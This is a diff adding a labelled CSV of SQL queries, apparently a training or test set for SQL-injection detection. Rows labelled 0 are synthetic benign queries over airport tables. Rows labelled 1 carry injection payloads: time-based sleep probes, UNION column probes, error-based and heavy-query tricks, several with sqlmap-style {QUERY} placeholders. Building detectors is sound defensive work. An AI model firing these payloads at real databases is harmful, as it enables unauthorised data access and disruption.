@@ -1,0 +1,69 @@
+query,label
+"select elevation_ft from airport_frequencies where elevation_ft=""1773"" or elevation_ft=""Preah Vihear province"";",0
+"select le_displaced_threshold_ft from airport_comments where le_displaced_threshold_ft=""125"" or le_displaced_threshold_ft=""Bulgan Province"";",0
+SELECT * FROM airport WHERE subject IS NULL;,0
+SELECT * FROM airport WHERE he_displaced_threshold_ft IS NULL;,0
+"SELECT continent, continent FROM regions WHERE continent='GM' OR continent='Auvergne-Rhône-Alpes';",0
+DELETE FROM navaids WHERE wikipedia_link IN (SELECT wikipedia_link FROM navaids WHERE wikipedia_link = '03AK');,0
+"delete  from airport_comments where he_longitude_deg=""Prince Patrick Is."";",0
+"DELETE FROM airport_frequencies WHERE memberNickname IN ((SELECT memberNickname FROM airport_frequencies WHERE memberNickname = 'A nice little airport with an outside cafe airside.')  UNION (SELECT memberNickname FROM airport_frequencies WHERE memberNickname = ""Ngao""));",0
+delete from airport;,0
+DELETE FROM countries WHERE elevation_ft IN (SELECT elevation_ft FROM countries WHERE elevation_ft = 'CYJN');,0
+UPDATE regions SET gps_code = 'GS' WHERE gps_code  = -3.012491 AND gps_code  = -118.241912;,0
+"UPDATE runways SET id = 'delayed flight' WHERE id  = ""Kerċem"";",0
+"UPDATE regions SET le_longitude_deg = 'Super gracious hosts' WHERE le_longitude_deg  = ""Bulawayo Metropolitan Province"";",0
+"UPDATE countries SET frequency_mhz = 'Current Updates' WHERE frequency_mhz  = ""Corsica"";",0
+"UPDATE runways SET he_latitude_deg = 'https://en.wikipedia.org/wiki/Cambodia', he_latitude_deg = 'MK' WHERE he_latitude_deg = 'Guadeloupe' ;",0
+"INSERT INTO runways (airportRef, airportRef, airportRef , airportRef, airportRef, airportRef) VALUES (20522, 20522, ""CPR1"", ""Ilulissat Airport"", 35.112458, -117.91699981689453);",0
+"INSERT INTO airport_comments (name, name, name , name, name, name) VALUES (2651, 2651, ""ATC backup"", ""Sydney International Airport Station"", -22.387733, 130.58485);",0
+"INSERT INTO airport (he_latitude_deg, he_latitude_deg, he_latitude_deg , he_latitude_deg, he_latitude_deg, he_latitude_deg) VALUES (27391, 27391, 51.19365, -98.6478);",0
+"INSERT INTO airport_frequencies (surface, surface, surface, surface, surface) VALUES (19311, 'BT', ""Petrópolis"", 'SBUA', NULL);",0
+"INSERT INTO airport_frequencies (he_latitude_deg, he_latitude_deg, he_latitude_deg , he_latitude_deg, he_latitude_deg, he_latitude_deg) VALUES (18910, 18910, 3.83604, -70.33920288085938);",0
+"SELECT le_displaced_threshold_ft, le_displaced_threshold_ft FROM countries WHERE le_displaced_threshold_ft='GP' OR le_displaced_threshold_ft='' (SELECT (CASE WHEN (3409!=3936) THEN 3355 ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)';",1
+"select he_latitude_deg from airport_comments where he_latitude_deg=""2330"" or he_latitude_deg="""" (SELECT (CASE WHEN (6104!=6844) THEN 9615 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)"";",1
+"SELECT airport_ent FROM countries WHERE airport_ent=""' (CAST('NGo'||{QUERY} ||'AQb' AS NUMERIC))"";",1
+"SELECT he_latitude_deg, he_latitude_deg FROM airport_frequencies WHERE he_latitude_deg='""https://en.wikipedia.org/wiki/Sudan  OR (SELECT 6081 FROM{QUERY}a)';",1
+"SELECT * FROM navaids WHERE "" (SELECT 'aqY'||{QUERY}||'T53' FROM DUAL) IS NULL;",1
+"SELECT continent FROM runways WHERE continent="""" (SELECT 'BO7'+{QUERY}+'YWd')"";",1
+"select date from navaids where date=""'3191  ;BEGIN USER_LOCK.SLEEP(7); END"" or date=""Kronoberge län"";",1
+"SELECT * FROM countries WHERE 'airport_ent  ;CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep(4) IS NULL;",1
+"SELECT * FROM runways WHERE ""code  OR SLEEP(1) IS NULL;",1
+"SELECT * FROM countries WHERE "" (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) IS NULL;",1
+"SELECT home_link FROM airport_comments WHERE home_link=""""El Salvador  UNION SELECT {COLUMN 10 CHA} #"";",1
+"SELECT body, body FROM countries WHERE body='ID' OR body='""Putumayo Department  UNION SELECT {COLUMN 40 CHA} #';",1
+"delete  from airport_comments where he_heading_degT=""'Godofredo Viana  AND 7077=7753"";",1
+"DELETE from navaids WHERE type=40.78200149536133 AND type=""-91.96520233154297  ,(SELECT * FROM GENERATE_SERIES(7678,6935,CASE WHEN (6271<=7999) THEN 1 ELSE 0 END) LIMIT 1);",1
+"delete  from runways where closed=""'Town of Princeton  ,(SELECT 2058 WHERE 1769=CONVERT(INT,(SELECT 'r6r'+{QUERY}+'xRP')))"";",1
+"delete  from airport_frequencies where length_ft=""""-3585  OR 7281 IN (SELECT ('50N'+{QUERY}+'4Q7'))"";",1
+"delete from "" (SELECT CONCAT(CONCAT('AR0',{QUERY}),'ozU'));",1
+delete from ' SELECT 'OxP'||{QUERY}||'L6r';,1
+"delete from ""airport  ;DECLARE @x CHAR(9);SET @x=0x303a303a37;WAITFOR DELAY @x;",1
+"DELETE FROM navaids WHERE he_ent IN ((SELECT he_ent FROM navaids WHERE he_ent = '""Airport localization  ;SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3')  UNION (SELECT he_ent FROM navaids WHERE he_ent = ""Igarassu(Igaraçu)""));",1
+"DELETE FROM regions WHERE description IN ((SELECT description FROM regions WHERE description = ''Heliport of Melendugno  OR 5946=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)')  UNION (SELECT description FROM regions WHERE description = ""Cape Girardeau""));",1
+"delete  from runways where id=""'Pryor  AND (SELECT 8506 FROM (SELECT(SLEEP(8)))bMBFXFhHlk)"";",1
+"DELETE FROM airport_frequencies WHERE airportent IN ((SELECT airportent FROM airport_frequencies WHERE airportent = 'xray people(main door)')  UNION (SELECT airportent FROM airport_frequencies WHERE airportent = ""'Laurie River  UNION SELECT {COLUMN 40 NUM} {GENERIC_SQL_COMMENT}""));",1
+"DELETE FROM airport WHERE he_displaced_threshold_ft IN (SELECT he_displaced_threshold_ft FROM airport WHERE he_displaced_threshold_ft = '""82OH  UNION SELECT {COLUMN 10 NUM} {GENERIC_SQL_COMMENT}');",1
+"UPDATE navaids SET entlatitude_deg = 'https://en.wikipedia.org/wiki/Cook_Islands', entlatitude_deg = 'FR' WHERE entlatitude_deg = ''Kenya  ;SELECT * FROM GENERATE_SERIES(5527,5860,CASE WHEN (222<4185) THEN 1 ELSE 0 END) LIMIT 1' ;",1
+"UPDATE airport_frequencies SET length_ft = 'EG' WHERE length_ft  = '38.030586  AND EXTRACTVALUE(1774,CASE WHEN (8049=3764) THEN 7261 ELSE 0x3A END) AND length_ft  = 142.392727;",1
+"UPDATE navaids SET closed = '"" JSON_KEYS((SELECT CONVERT((SELECT CONCAT('Js2',{QUERY},'Xvo')) USING utf8)))' WHERE closed  = ""Bangka Belitung"";",1
+"UPDATE airport SET continent = '""-5976  OR 8466=CAST('7jI'||{QUERY}::varchar||'clD' AS NUMERIC)', continent = 'GQ' WHERE continent = 'Moldova' ;",1
+UPDATE navaids SET lighted = 'RE' WHERE lighted  = -3.749456 AND lighted  = ' SELECT 'H4r'||{QUERY}||'1xh';,1
+UPDATE airport_comments SET iso_country = '' SELECT 'ikG'||{QUERY}||'xIK'' WHERE iso_country  = -4.886897 AND iso_country  = 120.268279;,1
+"UPDATE navaids SET description = 'https://en.wikipedia.org/wiki/Tanzania', description = 'KR' WHERE description = '""Myanmar  ;BEGIN DBMS_LOCK.SLEEP(5); END--' ;",1
+"UPDATE countries SET he_displaced_threshold_ft = ""2849  ;SELECT PG_SLEEP(4);",1
+"UPDATE countries SET iso_country = 'https://en.wikipedia.org/wiki/Caribbean_Netherlands', iso_country = '""PL  AND 1467=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--' WHERE iso_country = 'Svalbard' ;",1
+"UPDATE airport SET he_displaced_threshold_ft = 'New Airport Management' WHERE he_displaced_threshold_ft  = ""'Aragatsotn Province  OR 5852=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"";",1
+"UPDATE countries SET entlatitude_deg = 'Status' WHERE entlatitude_deg  = """"Hauts-de-France  UNION SELECT {COLUMN 20 NUL} {GENERIC_SQL_COMMENT}"";",1
+"UPDATE countries SET home_link = '""NZ  UNION SELECT {COLUMN 10 NUL} {GENERIC_SQL_COMMENT}' WHERE home_link  = 32.32939910888672 AND home_link  = -71.09420013427734;",1
+"INSERT INTO airport_frequencies (length_ft, length_ft ) VALUES (""deborah"", 'Cortina Airport information'), (""deborah"", ''Re: looking for good advice  ,(SELECT * FROM GENERATE_SERIES(7442,3132,CASE WHEN (5646>=9774) THEN 1 ELSE 0 END) LIMIT 1)');",1
+"INSERT INTO airport (he_longitude_deg, he_longitude_deg, he_longitude_deg , he_longitude_deg, he_longitude_deg, he_longitude_deg) VALUES (5188, 5188, -36.295969, "" (SELECT (CASE WHEN (2631<5990) THEN 9262 ELSE 8254*(SELECT 8897 UNION ALL SELECT {RANDNUM1}) END));",1
+"INSERT INTO countries (body, body ) VALUES (""alexis"", 're: 3rd time to leave PH, working freelance'), (""'rooster  AND 5070=('AO8'||{QUERY}||'Baz')"", 're: 3rd time to leave PH, working freelance');",1
+"INSERT INTO airport_frequencies (he_displaced_threshold_ft, he_displaced_threshold_ft ) VALUES (""cassandr"", 'Make !!! Make !!! Make !!!'), (""""grahm  ,GTID_SUBSET(CONCAT('78G',{QUERY},'cNT'),5298)"", 'Make !!! Make !!! Make !!!');",1
+"INSERT INTO navaids (surface, surface ) VALUES (""tarpon"", '' (SELECT CONCAT('gRi',{QUERY},'6Mb'))'), (""tarpon"", 'Runway Closed as of 2/25/12');",1
+"INSERT INTO navaids (entlatitude_deg, entlatitude_deg, entlatitude_deg, entlatitude_deg, entlatitude_deg) VALUES (21025, 'IT', """" SELECT 'pwv'||{QUERY}||'C0z' FROM RDB$DATABASE"", 'HADD', NULL);",1
+"INSERT INTO airport_frequencies (airport_ent, airport_ent, airport_ent , airport_ent, airport_ent, airport_ent) VALUES (6502, 6502, ""'AUTO INFO  ;SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(900000000/2))))"", ""Brandenburg Hbf"", 37.52920150756836, -102.52799987792969);",1
+"INSERT INTO airport (he_elevation_ft, he_elevation_ft, he_elevation_ft , he_elevation_ft, he_elevation_ft, he_elevation_ft) VALUES (18316, 18316, 40.065822, '-85.871916  ;WAITFOR DELAY '0:0:2');",1
+"INSERT INTO runways (lighted, lighted, lighted , lighted, lighted, lighted) VALUES (46539, 46539, 34.73979949951172, ' BEGIN IF (5688=207) THEN DBMS_LOCK.SLEEP(1); ELSE DBMS_LOCK.SLEEP(0); END IF; END;);",1
+"INSERT INTO airport (threadRef, threadRef ) VALUES (""""qwert  OR 8110=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"", 'WHAT IS HERE'), (""accord"", 'WHAT IS HERE');",1
+"INSERT INTO airport_comments (le_displaced_threshold_ft, le_displaced_threshold_ft ) VALUES (""kayleigh"", 'People in immigration so .......'), (""""women  UNION SELECT {COLUMN 20 NUL} {GENERIC_SQL_COMMENT}"", 'People in immigration so .......');",1
+"INSERT INTO countries (threadRef, threadRef, threadRef , threadRef, threadRef, threadRef) VALUES (26852, ""18640  UNION SELECT {COLUMN RA CHA} {GENERIC_SQL_COMMENT}, 37.412624, 23.526018);",1
